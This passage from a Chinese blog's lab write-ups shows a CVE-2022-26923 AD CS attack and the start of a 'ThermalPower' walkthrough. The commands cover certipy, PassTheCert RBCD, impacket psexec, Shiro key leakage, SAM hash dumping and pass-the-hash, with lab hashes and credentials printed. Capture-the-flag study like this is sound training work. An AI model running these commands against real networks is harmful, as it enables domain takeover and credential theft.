class="hljs-built_in">Directory</span> 证书服务（<span class="hljs-variable">CS</span>）在域上运行时，由于机器账号中的 <span class="hljs-variable">dNSHostName</span> 属性不具有唯一性，域中普通用户可以将其更改为高权限的域控机器账号属性，然后从 <span class="hljs-built_in">Active</span> <span class="hljs-built_in">Directory</span> 证书服务中获取域控机器账户的证书，导致域中普通用户权限提升为域管理员权限<br></code></pre></td></tr></table></figure><p>创建一个机器用户将该机器用户 dNSHostName 属性指向域控，先下载 certipy-ad，<a href="https://github.com/ly4k/Certipy/wiki/04-%E2%80%90-Installation">Certipy</a></p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">proxychains certipy-ad account <span class="hljs-keyword">create</span> -<span class="hljs-keyword">user</span> <span class="hljs-string">&#x27;butt3rf2y$&#x27;</span> -pass <span class="hljs-string">&#x27;p4ppy&#x27;</span> -dc-ip <span class="hljs-number">172.22</span><span class="hljs-number">.15</span><span class="hljs-number">.13</span> -u lixiuying -p <span class="hljs-string">&#x27;winniethepooh&#x27;</span> -dns XR-DC01.xiaorang.lab<br></code></pre></td></tr></table></figure><p>成功写入后，向 AD CS 请求域控的证书</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains</span> certipy-ad req -u <span class="hljs-string">&#x27;butt3rf2y$<span class="hljs-variable">@xiaorang</span>.lab&#x27;</span> -p <span class="hljs-string">&#x27;p4ppy&#x27;</span> -target <span class="hljs-number">172.22.15.18</span> -ca <span class="hljs-string">&#x27;xiaorang-XR-CA-CA&#x27;</span> -template <span class="hljs-string">&#x27;Machine&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/d228be69b9e00bb2.png"></p><p>然后用申请的证书请求 DC$ 的 TGT</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains</span> certipy-ad auth -pfx xr-dc01.pfx -dc-ip <span class="hljs-number">172.22.15.13</span><br></code></pre></td></tr></table></figure><p>遇到了错误：</p><p>Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)</p><p>换成设置 RBCD 来攻击，通过 Schannel 将证书传递到 LDAPS, 修改 LDAP 配置 (例如配置 RBCD &#x2F; DCSync), 来获得域控权限</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">openssl pkcs12 -<span class="hljs-keyword">in</span> xr-dc01<span class="hljs-selector-class">.pfx</span> -out xr-dc01<span class="hljs-selector-class">.pem</span> -nodes<br>openssl rsa -<span class="hljs-keyword">in</span> xr-dc01<span class="hljs-selector-class">.pem</span> -out xr-dc01<span class="hljs-selector-class">.key</span><br>openssl x509 -<span class="hljs-keyword">in</span> xr-dc01<span class="hljs-selector-class">.pem</span>  -out xr-dc01.crt<br></code></pre></td></tr></table></figure><p>地址：<a href="https://github.com/AlmondOffSec/PassTheCert/">https://github.com/AlmondOffSec/PassTheCert/</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">proxychains python3 PassTheCert-main/Python/passthecert<span class="hljs-selector-class">.py</span> -action whoami -crt xr-dc01<span class="hljs-selector-class">.crt</span> -key xr-dc01<span class="hljs-selector-class">.key</span> -domain xiaorang<span class="hljs-selector-class">.lab</span> -dc-ip <span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/19796c299b6b0215.png"></p><p>将证书配置到域控的 RBCD</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">proxychains python3 PassTheCert-main/Python/passthecert.py -action write_rbcd -crt xr-dc01.crt -key xr-dc01.key -domain xiaorang.lab -dc-ip <span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span> -<span class="hljs-keyword">delegate</span>-<span class="hljs-keyword">to</span> <span class="hljs-string">&#x27;XR-DC01$&#x27;</span> -<span class="hljs-keyword">delegate</span>-<span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;butt3rf2y$&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/ad159b4f84bb39b6.png"></p><p>申请ST</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains</span> impacket-getST xiaorang.lab/<span class="hljs-string">&#x27;butt3rf2y$&#x27;</span>:<span class="hljs-string">&#x27;p4ppy&#x27;</span> -spn cifs/XR-DC01.xiaorang.lab -impersonate Administrator -dc-ip <span class="hljs-number">172.22.15.13</span><br></code></pre></td></tr></table></figure><p>然后导入</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">KRB5CCNAME</span>=Administrator@cifs_XR-DC01.xiaorang.lab@XIAORANG.LAB.ccache<br></code></pre></td></tr></table></figure><p>配置下 hosts</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.22.15.13</span>XR-DC01.xiaorang.lab<br></code></pre></td></tr></table></figure><p>连接就行了</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains</span> impacket-psexec Administrator<span class="hljs-variable">@XR</span>-DC01.xiaorang.lab -k -<span class="hljs-literal">no</span>-pass -dc-ip <span class="hljs-number">172.22.15.13</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/d41095a4440eaf38.png"></p><p>拿到 flag04</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag04</span>: flag&#123;c2278fc6-e66f-<span class="hljs-number">4</span>f16-<span class="hljs-number">827</span>a-<span class="hljs-number">84</span>ffcd44b462&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
      <category>靶机</category>
      
      <category>春秋云镜</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网渗透 WordPress AS-REP Roasting CVE-2022-26923</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>春秋云镜-ThermalPower</title>
    <link href="/2025/07/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-ThermalPower/"/>
    <url>/2025/07/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-ThermalPower/</url>
    
    <content type="html"><![CDATA[<p>Heapdump 内存信息泄露、Shiro 反序列化、注册表 SAM 转储、.NET 逆向</p><span id="more"></span><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="fscan"><a href="#fscan" class="headerlink" title="fscan"></a>fscan</h2><p>扫到两个</p><p><img src="https://img.dkdun.cn/v1/2025/12/c326cd8c6587a003.png"></p><h2 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h2><p>扫目录</p><p><img src="https://img.dkdun.cn/v1/2025/12/8701b005bcadc422.png"></p><p>发现有 heapdump</p><h1 id="Heapdump-内存泄露"><a href="#Heapdump-内存泄露" class="headerlink" title="Heapdump 内存泄露"></a>Heapdump 内存泄露</h1><p>下载下来读取</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs vim">ubuntu@VM-<span class="hljs-number">4</span>-<span class="hljs-number">7</span>-ubuntu:~$ java -jar heapdump_tool.jar heapdump<br>[-] <span class="hljs-keyword">file</span>: heapdump<br>[-] Start jhat, waiting...<br>[-] fing object <span class="hljs-built_in">count</span>: <span class="hljs-number">86326</span><br>[-] too many object,please <span class="hljs-built_in">input</span> <span class="hljs-number">0</span>/<span class="hljs-number">1</span> <span class="hljs-keyword">to</span> choose <span class="hljs-keyword">mode</span>.<br><span class="hljs-number">0</span>. (<span class="hljs-built_in">search</span> data, may can<span class="hljs-string">&#x27;t find some data, can&#x27;</span>t use <span class="hljs-keyword">function</span> <span class="hljs-title">num</span>=,len=,getip,geturl,getfile).<br><span class="hljs-number">1</span>. (load <span class="hljs-keyword">all</span> object, need wait <span class="hljs-keyword">a</span> few minutes).<br>&gt; <span class="hljs-number">0</span><br>[-] please <span class="hljs-built_in">input</span> keyword value <span class="hljs-keyword">to</span> <span class="hljs-built_in">search</span>, example: password,re=xxx,<span class="hljs-built_in">len</span>=<span class="hljs-number">16</span>,num=<span class="hljs-number">0</span>-<span class="hljs-number">10</span>,id=<span class="hljs-number">0</span>x123a,class=org.xx,<span class="hljs-keyword">all</span>=true,geturl,getfile,getip,shirokey,systemproperties,allproperties,hashtable <span class="hljs-built_in">input</span> q/<span class="hljs-keyword">quit</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">quit</span>.<br>&gt; shirokey<br>&gt;&gt; QZYysjAYhG6/sDKQlVpR2g==<br>[-] please <span class="hljs-built_in">input</span> keyword value <span class="hljs-keyword">to</span> <span class="hljs-built_in">search</span>, example: password,re=xxx,<span class="hljs-built_in">len</span>=<span class="hljs-number">16</span>,num=<span class="hljs-number">0</span>-<span class="hljs-number">10</span>,id=<span class="hljs-number">0</span>x123a,class=org.xx,<span class="hljs-keyword">all</span>=true,geturl,getfile,getip,shirokey,systemproperties,allproperties,hashtable <span class="hljs-built_in">input</span> q/<span class="hljs-keyword">quit</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">quit</span>.<br>&gt; <br></code></pre></td></tr></table></figure><p>拿到 key：QZYysjAYhG6&#x2F;sDKQlVpR2g&#x3D;&#x3D;</p><h1 id="Shiro-反序列化"><a href="#Shiro-反序列化" class="headerlink" title="Shiro 反序列化"></a>Shiro 反序列化</h1><p><img src="https://img.dkdun.cn/v1/2025/12/0724c28964e55125.png"></p><p>尝试了蚁剑、冰蝎都注入成功，但是连接不上，最后还得是哥斯拉</p><p><img src="https://img.dkdun.cn/v1/2025/12/78f27e1411a8fea0.png"></p><p>在根目录下找到 flag01</p><p><img src="https://img.dkdun.cn/v1/2025/12/fe385b827111b913.png"></p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">flag01: flag&#123;759069eb-<span class="hljs-number">46b7</span>-<span class="hljs-number">4905</span>-b6c6-bf95f66233c7&#125;<br></code></pre></td></tr></table></figure><h1 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h1><p>上传 fscan 扫描内网信息，本机为 172.22.17.213 </p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs inform7">/ &gt;/bin/sh -c <span class="hljs-string">&quot;cd /tmp &amp;&amp; ./FScan_2.0.1_linux_x64 -h 172.22.17.213/24&quot;</span> <br>┌──────────────────────────────────────────────┐<br>│    ___                              _        │<br>│   / _ \     ___  ___ _ __ __ _  ___| | __    │<br>│  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    │<br>│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │<br>│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │<br>└──────────────────────────────────────────────┘<br>      Fscan Version: 2.0.1<br><br><span class="hljs-comment">[1.9s]</span>     已选择服务扫描模式<br><span class="hljs-comment">[1.9s]</span>     开始信息扫描<br><span class="hljs-comment">[1.9s]</span>     CIDR范围: 172.22.17.0-172.22.17.255<br><span class="hljs-comment">[1.9s]</span>     generate_ip_range_full<br><span class="hljs-comment">[1.9s]</span>     解析CIDR 172.22.17.213/24 -&gt; IP范围 172.22.17.0-172.22.17.255<br><span class="hljs-comment">[1.9s]</span>     最终有效主机数量: 256<br><span class="hljs-comment">[1.9s]</span>     开始主机扫描<br><span class="hljs-comment">[1.9s]</span>     使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle<br><span class="hljs-comment">[1.9s]</span> <span class="hljs-comment">[*]</span> 目标 172.22.17.213   存活 (ICMP)<br><span class="hljs-comment">[1.9s]</span> <span class="hljs-comment">[*]</span> 目标 172.22.17.6     存活 (ICMP)<br><span class="hljs-comment">[4.9s]</span>     存活主机数量: 2<br><span class="hljs-comment">[4.9s]</span>     有效端口数量: 233<br><span class="hljs-comment">[4.9s]</span> <span class="hljs-comment">[*]</span> 端口开放 172.22.17.213:22<br><span class="hljs-comment">[4.9s]</span> <span class="hljs-comment">[*]</span> 端口开放 172.22.17.213:8080<br><span class="hljs-comment">[4.9s]</span> <span class="hljs-comment">[*]</span> 端口开放 172.22.17.6:445<br><span class="hljs-comment">[4.9s]</span> <span class="hljs-comment">[*]</span> 端口开放 172.22.17.6:139<br><span class="hljs-comment">[4.9s]</span> <span class="hljs-comment">[*]</span> 端口开放 172.22.17.6:135<br><span class="hljs-comment">[4.9s]</span> <span class="hljs-comment">[*]</span> 端口开放 172.22.17.6:21<br><span class="hljs-comment">[4.9s]</span> <span class="hljs-comment">[*]</span> 端口开放 172.22.17.6:80<br><span class="hljs-comment">[6.0s]</span>     扫描完成, 发现 7 个开放端口<br><span class="hljs-comment">[6.0s]</span>     存活端口数量: 7<br><span class="hljs-comment">[6.0s]</span>     开始漏洞扫描<br><span class="hljs-comment">[6.1s]</span>     POC加载完成: 总共387个，成功387个，失败0个<br><span class="hljs-comment">[6.1s]</span> <span class="hljs-comment">[+]</span> NetBios 172.22.17.6     WORKGROUP\WIN-ENGINEER        <br><span class="hljs-comment">[6.1s]</span> <span class="hljs-comment">[*]</span> NetInfo 扫描结果<br>目标主机: 172.22.17.6<br>主机名: WIN-ENGINEER<br>发现的网络接口:<br>   IPv4地址:<br>      └─ 172.22.17.6<br><span class="hljs-comment">[6.2s]</span> <span class="hljs-comment">[*]</span> 网站标题 http://172.22.17.6        状态码:200 长度:661    标题:172.22.17.6 - /<br><span class="hljs-comment">[6.2s]</span> <span class="hljs-comment">[+]</span> FTP服务 172.22.17.6:21 匿名登录成功!<br><span class="hljs-comment">[6.3s]</span> <span class="hljs-comment">[*]</span> 网站标题 http://172.22.17.213:8080 状态码:302 长度:0      标题:无标题 重定向地址: http://172.22.17.213:8080/login;jsessionid=AB5C64F629CA583DECFC46E1201AAD54<br><span class="hljs-comment">[6.4s]</span> <span class="hljs-comment">[*]</span> 网站标题 http://172.22.17.213:8080/login;jsessionid=AB5C64F629CA583DECFC46E1201AAD54 状态码:200 长度:2936   标题:火创能源监控画面管理平台<br><span class="hljs-comment">[7.9s]</span> <span class="hljs-comment">[+]</span> 目标: http://172.22.17.213:8080<br>  漏洞类型: poc-yaml-springboot-env-unauth<br>  漏洞名称: spring2<br>  详细信息:<br>参考链接:https://github.com/LandGrey/SpringBootVulExploit<br><span class="hljs-comment">[43.5s]</span>     扫描已完成: 12/12<br></code></pre></td></tr></table></figure><p>发现</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.22.17.6</span>WIN-ENGINEER<br></code></pre></td></tr></table></figure><p>frp 流量转发</p><p><img src="https://img.dkdun.cn/v1/2025/12/c1ca661508611afe.png"></p><p>拿到内部资料</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">WIN-SCADA: <span class="hljs-number">172.22</span><span class="hljs-number">.26</span>.xx<br><span class="hljs-symbol">Username:</span> Administrator<br><span class="hljs-symbol">Password:</span> IYnT3GyCiy3<br><br><span class="hljs-number">1.</span> 登陆权限限制：<br>   为确保信息系统的安全性，自即日起，公司所有工程师PC的登陆将由SCADA工程师进行控制。请各位工程师注意，只能通过SCADA工程师提供的登陆方式进行访问。<br><span class="hljs-number">2.</span> 登陆账户设置：<br>   为方便管理和标准化，登陆账户名将采用姓名全称的小写拼音形式。例如，张三的账户名为zhangsan，工号为<span class="hljs-number">0801</span>。初始密码将由账户名+@+工号组成，例如，zhangsan<span class="hljs-subst">@0801</span>。<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/8dfe0b8e3691111a.png"></p><p>提取 SCADA 工程师信息，推测登录账号密码为</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">chenhua/<span class="hljs-symbol">chenhua@</span><span class="hljs-number">0813</span><br>zhaoli/<span class="hljs-symbol">zhaoli@</span><span class="hljs-number">0821</span><br>wangning/<span class="hljs-symbol">wangning@</span><span class="hljs-number">0837</span><br>zhangling/<span class="hljs-symbol">zhangling@</span><span class="hljs-number">0871</span><br>zhangying/<span class="hljs-symbol">zhangying@</span><span class="hljs-number">0888</span><br>wangzhiqiang/<span class="hljs-symbol">wangzhiqiang@</span><span class="hljs-number">0901</span><br>chentao/<span class="hljs-symbol">chentao@</span><span class="hljs-number">0922</span><br>zhouyong/<span class="hljs-symbol">zhouyong@</span><span class="hljs-number">0939</span><br>lilong/<span class="hljs-symbol">lilong@</span><span class="hljs-number">1046</span><br>liyumei/<span class="hljs-symbol">liyumei@</span><span class="hljs-number">1048</span><br></code></pre></td></tr></table></figure><p>测试 SMB 登录</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains</span> -q crackmapexec smb <span class="hljs-number">172.22.17.6</span> -u chenhua -p <span class="hljs-string">&#x27;chenhua@0813&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/236af1fad698956c.png"></p><h1 id="注册表-SAM-转储"><a href="#注册表-SAM-转储" class="headerlink" title="注册表 SAM 转储"></a>注册表 SAM 转储</h1><p>rdp 连接，但是没有权限访问 Administrator，进行权限提升</p><p>查看当前访问令牌中的所有信息，包括当前用户名、安全标识符（SID）、特权和当前用户所属的组</p><p><img src="https://img.dkdun.cn/v1/2025/12/a8ac0dd38ff367e9.png"></p><p>用管理员模式转存 SAM 文件</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">reg save hklm\sam <span class="hljs-name">C</span>:\Users\chenhua\Desktop\sam<br>reg save hklm\system <span class="hljs-name">C</span>:\Users\chenhua\Desktop\system<br></code></pre></td></tr></table></figure><p>复制出来，提取</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs elixir">python secretsdumps.py -sam sam -system system <span class="hljs-title class_">LOCAL</span><br><span class="hljs-title class_">Impacket</span> v0.<span class="hljs-number">12.0</span> - <span class="hljs-title class_">Copyright</span> <span class="hljs-title class_">Fortra</span>, <span class="hljs-title class_">LLC</span> <span class="hljs-keyword">and</span> its affiliated companies<br><br>[*] <span class="hljs-title class_">Target</span> system <span class="hljs-symbol">bootKey:</span> <span class="hljs-number">0x6c2be46aaccdf65a9b7be2941d6e7759</span><br>[*] <span class="hljs-title class_">Dumping</span> local <span class="hljs-title class_">SAM</span> hashes (<span class="hljs-symbol">uid:</span><span class="hljs-symbol">rid:</span><span class="hljs-symbol">lmhash:</span>nthash)<br><span class="hljs-symbol">Administrator:</span><span class="hljs-number">500</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:f82292b7ac79b05d5b0e3d302bd0d279</span>:::<br><span class="hljs-symbol">Guest:</span><span class="hljs-number">501</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::<br><span class="hljs-symbol">DefaultAccount:</span><span class="hljs-number">503</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::<br><span class="hljs-symbol">WDAGUtilityAccount:</span><span class="hljs-number">504</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:a2fa2853651307ab9936cc95c0e0acf5</span>:::<br><span class="hljs-symbol">chentao:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">47466010</span>c82da0b75328192959da3658:::<br><span class="hljs-symbol">zhaoli:</span><span class="hljs-number">1001</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span>b83822caab67ef07b614d05fd72e215:::<br><span class="hljs-symbol">wangning:</span><span class="hljs-number">1002</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span>c52d89c176321511ec686d6c05770e3:::<br><span class="hljs-symbol">zhangling:</span><span class="hljs-number">1003</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">8349</span>a4c5dd1bdcbc5a14333dd13d9f81:::<br><span class="hljs-symbol">zhangying:</span><span class="hljs-number">1004</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">8497</span>fa5480a163cb7817f23a8525be7d:::<br><span class="hljs-symbol">lilong:</span><span class="hljs-number">1005</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:c3612c48cf829d1149f7a4e3ef4acb8a</span>:::<br><span class="hljs-symbol">liyumei:</span><span class="hljs-number">1006</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">63</span>ddcde0fa219c75e48e2cba6ea8c471:::<br><span class="hljs-symbol">wangzhiqiang:</span><span class="hljs-number">1007</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">5</span>a661f54da156dc93a5b546ea143ea07:::<br><span class="hljs-symbol">zhouyong:</span><span class="hljs-number">1008</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">5</span>d49bf647380720b9f6a15dbc3ffe432:::<br><span class="hljs-symbol">chenhua:</span><span class="hljs-number">1009</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">07</span>ff24422b538b97f3c297cc8ddc7615:::<br>[*] <span class="hljs-title class_">Cleaning</span> up...<br></code></pre></td></tr></table></figure><p>拿到 Administrator 的 Hash</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">proxychains</span> -q impacket-psexec Administrator@<span class="hljs-number">172.22.17.6</span> -hashes <span class="hljs-number">0</span>:f82292b7ac79b05d5b0e3d302bd0d279<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/c0a05e383070f59b.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag02</span>: flag&#123;<span class="hljs-number">27680433</span>-<span class="hljs-number">4467</span>-<span class="hljs-number">467</span>a-<span class="hljs-number">96</span>fd-<span class="hljs-number">6</span>ca09258cef8&#125;<br></code></pre></td></tr></table></figure><h1 id="rdp-连接"><a href="#rdp-连接" class="headerlink" title="rdp 连接"></a>rdp 连接</h1><p>用 fscan 扫描 172.22.26.0&#x2F;24 发现能成功扫出结果</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs inform7">/ &gt;/bin/sh -c <span class="hljs-string">&quot;cd /tmp &amp;&amp; ./FScan_2.0.1_linux_x64 -h 172.22.26.0/24&quot;</span> <br>┌──────────────────────────────────────────────┐<br>│    ___                              _        │<br>│   / _ \     ___  ___ _ __ __ _  ___| | __    │<br>│  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    │<br>│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │<br>│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │<br>└──────────────────────────────────────────────┘<br>      Fscan Version: 2.0.1<br><br><span class="hljs-comment">[1.8s]</span>     已选择服务扫描模式<br><span class="hljs-comment">[1.8s]</span>     开始信息扫描<br><span class="hljs-comment">[1.8s]</span>     CIDR范围: 172.22.26.0-172.22.26.255<br><span class="hljs-comment">[1.8s]</span>     generate_ip_range_full<br><span class="hljs-comment">[1.8s]</span>     解析CIDR 172.22.26.0/24 -&gt; IP范围 172.22.26.0-172.22.26.255<br><span class="hljs-comment">[1.8s]</span>     最终有效主机数量: 256<br><span class="hljs-comment">[1.8s]</span>     开始主机扫描<br><span class="hljs-comment">[1.8s]</span>     使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle<br><span class="hljs-comment">[1.8s]</span> <span class="hljs-comment">[*]</span> 目标 172.22.26.11    存活 (ICMP)<br><span class="hljs-comment">[4.8s]</span>     存活主机数量: 1<br><span class="hljs-comment">[4.8s]</span>     有效端口数量: 233<br><span class="hljs-comment">[4.8s]</span> <span class="hljs-comment">[*]</span> 端口开放 172.22.26.11:135<br><span class="hljs-comment">[4.8s]</span> <span class="hljs-comment">[*]</span> 端口开放 172.22.26.11:1433<br><span class="hljs-comment">[4.8s]</span> <span class="hljs-comment">[*]</span> 端口开放 172.22.26.11:80<br><span class="hljs-comment">[4.8s]</span> <span class="hljs-comment">[*]</span> 端口开放 172.22.26.11:445<br><span class="hljs-comment">[4.8s]</span> <span class="hljs-comment">[*]</span> 端口开放 